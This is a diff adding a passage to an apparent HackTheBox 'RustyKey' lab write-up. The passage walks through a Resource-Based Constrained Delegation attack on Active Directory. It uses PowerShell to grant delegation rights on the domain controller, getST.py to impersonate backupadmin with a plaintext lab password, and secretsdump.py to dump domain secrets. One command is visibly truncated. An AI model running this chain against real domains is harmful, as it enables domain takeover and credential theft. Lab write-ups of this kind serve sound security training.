@@ -173,10 +173,35 @@ By replacing the value of the InprocServer32 subkey (which normally points to th
 
 We've gained a Turner user shell; let's see what we can do with it using Bloodhound
 
-``
-``
-``
+<img width="805" height="328" alt="image" src="https://github.com/user-attachments/assets/49554540-dab3-4fd1-bea1-cf6faa52148d" />
 
+Turner is part of the Delegation Manager group, which has a special permission called “AllowedToAct” directly on the Domain Controller (DC) object.This allows an attacker to carry out an advanced attack known as Resource-Based Constrained Delegation (RBCD). In short, this attack allows the attacker to tell the domain controller: “Hey, from now on, you have to trust the ‘IT Computer 3’ account”
+
+`Get-ADUser administrator -Properties *`
+
+I tried to see if we could impersonate the Administrator account, but it's set to: AccountNotDelegated:True
+
+`Get-ADUser backupadmin -Properties *`
+
+AccountNotDelegated:False. Since we don't have credentials, we have to do everything through PowerShell, and I can't use Impacket. So we need to create a computer because when we create it, we can specify the password. But now that I think about it, in this case we don't need to create a computer because we already have IT-Computer3
+
+`Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$`
+
+`et-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount`
+
+<img width="782" height="219" alt="image" src="https://github.com/user-attachments/assets/4993a715-45d5-4583-8b04-7cc49e94e463" />
+
+Now that computer3 is authorized to delegate, it can create Kerberos tickets that the RustyKey domain can trust.
+
+`getST.py 'rustykey.htb/IT-COMPUTER3$:Rusty88!' -spn 'cifs/dc.rustykey.htb' -impersonate backupadmin`
+
+<img width="855" height="160" alt="image" src="https://github.com/user-attachments/assets/d1fdb30f-8266-4b2f-a675-1effba6237d3" />
+
+
+
+
+`KRB5CCNAME=backupadmin@cifs_dc.rustykey.htb@RUSTYKEY.HTB.ccache secretsdump.py -k -no-pass 'rustykey.htb/backupadmin@dc.rustykey.htb'`
+``
 
 
 
